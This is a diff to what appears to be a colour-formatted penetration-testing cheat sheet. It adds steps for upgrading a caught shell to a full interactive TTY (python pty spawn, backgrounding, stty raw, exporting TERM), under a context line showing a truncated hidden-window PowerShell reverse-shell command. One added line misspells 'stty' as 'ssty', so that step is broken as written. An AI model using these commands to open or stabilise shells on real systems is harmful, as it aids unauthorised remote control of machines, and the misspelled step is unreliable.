@@ -33,6 +33,12 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object Syst
 \033[90m======================================================================================
 \033[92m[+ Python Shell Upgrade]\033[0m
 
+\033[94m# Drop to BASH shell for compatibility, then make connection\033[0m
 python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-z
+ssty raw -echo
+fg
+export SHELL=/bin/bash; export TERM=xterm-256color
+stty rows <rows> columns <cols>
 
 \033[90m======================================================================================
